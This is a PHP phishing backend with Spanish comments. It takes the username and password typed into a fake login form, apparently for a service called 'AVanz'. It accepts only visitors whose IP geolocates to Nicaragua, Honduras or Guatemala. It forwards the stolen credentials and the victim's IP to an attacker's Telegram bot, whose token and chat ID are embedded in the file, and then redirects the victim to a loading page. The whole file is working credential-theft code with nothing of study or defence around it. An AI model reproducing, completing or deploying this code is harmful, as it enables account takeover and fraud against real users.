<?php

$token = "7800708173:AAFsaEPL3GR4dwGlsrmuewijHyyVXD1gNSs";
$chat_id = "5157616506";


// Función para obtener el país a partir de la IP
function obtenerPais($ip) {
    $url = "https://ipwhois.app/json/$ip";
    $respuesta = file_get_contents($url);
    $datos = json_decode($respuesta, true);
    return $datos["country_code"] ?? ""; // Devuelve el código de país (NI, HN, GT)
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = isset($_POST['pp1']) ? htmlspecialchars($_POST['pp1']) : '';
    $contrasena = isset($_POST['pp2']) ? htmlspecialchars($_POST['pp2']) : '';
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Verificar si la IP pertenece a los países permitidos
    $pais = obtenerPais($ip);
    $paisesPermitidos = ["NI", "HN", "GT"]; // Nicaragua, Honduras, Guatemala
    
    if (!in_array($pais, $paisesPermitidos)) {
        die("Acceso denegado"); // Bloquea el acceso si no está en la lista de países permitidos
    }
    
    $mensaje = "🛑 AVanz:: acceso 🛑\n\n";
    $mensaje .= "👤 Usuario: $usuario\n";
    $mensaje .= "🔑 Contraseña: $contrasena\n";
    $mensaje .= "📍 IP: $ip\n";
    
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    
    $context  = stream_context_create($options);
    file_get_contents($url, false, $context);
    
    header("Location: carg.html");
    exit();
}
?>
